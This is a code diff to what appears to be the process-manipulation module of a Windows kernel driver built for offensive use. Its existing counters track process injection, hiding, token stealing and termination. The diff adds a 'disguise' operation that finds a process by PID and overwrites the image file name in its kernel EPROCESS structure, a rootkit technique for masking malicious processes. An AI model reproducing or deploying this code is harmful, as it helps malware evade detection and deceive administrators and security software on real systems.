@@ -58,6 +58,7 @@ static volatile LONG64 g_proc_freezes;
 static volatile LONG64 g_proc_thaws;
 static volatile LONG64 g_proc_injects;
 static volatile LONG64 g_proc_hides;
+static volatile LONG64 g_proc_disguises;
 static volatile LONG64 g_proc_steals;
 static volatile LONG64 g_proc_terms;
 
@@ -924,7 +925,7 @@ NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
      * afterwards is zero and every call silently becomes a snapshot.
      */
     RtlCopyMemory(&r, in, sizeof(r));
-    if (r.op > YGHV_PROC_OP_HIDE) return STATUS_INVALID_PARAMETER;
+    if (r.op > YGHV_PROC_OP_DISGUISE) return STATUS_INVALID_PARAMETER;
 
     InterlockedIncrement64(&g_proc_ops);
 
@@ -1034,6 +1035,48 @@ NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
         st = STATUS_SUCCESS;
         *info = 8 * 8;
         break;
+
+    case YGHV_PROC_OP_DISGUISE: {
+        PEPROCESS proc = NULL;
+        NTSTATUS pst;
+        char *iname;
+
+        if (!r.name[0]) {
+            InterlockedIncrement64(&g_proc_fails);
+            o[1] = YGHV_PROC_E_BAD_ARG;
+            st = STATUS_SUCCESS;
+            break;
+        }
+        pst = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)r.pid, &proc);
+        if (!NT_SUCCESS(pst)) {
+            InterlockedIncrement64(&g_proc_fails);
+            o[1] = YGHV_PROC_E_NO_TARGET;
+            st = STATUS_SUCCESS;
+            break;
+        }
+        iname = yghv_proc_image_name(proc);
+        if (!iname) {
+            ObDereferenceObject(proc);
+            InterlockedIncrement64(&g_proc_fails);
+            o[1] = YGHV_PROC_E_OFFSETS;
+            st = STATUS_SUCCESS;
+            break;
+        }
+        {
+            /* image_file_name is 15 bytes + NUL in EPROCESS */
+            size_t nlen = 0;
+            while (nlen < 15 && r.name[nlen]) nlen++;
+            RtlZeroMemory(iname, 15);
+            RtlCopyMemory(iname, r.name, nlen);
+            InterlockedIncrement64(&g_proc_disguises);
+            o[0] = 1;
+            o[1] = 0;
+            o[2] = r.pid;
+            st = STATUS_SUCCESS;
+        }
+        ObDereferenceObject(proc);
+        break;
+    }
     }
 
     default:
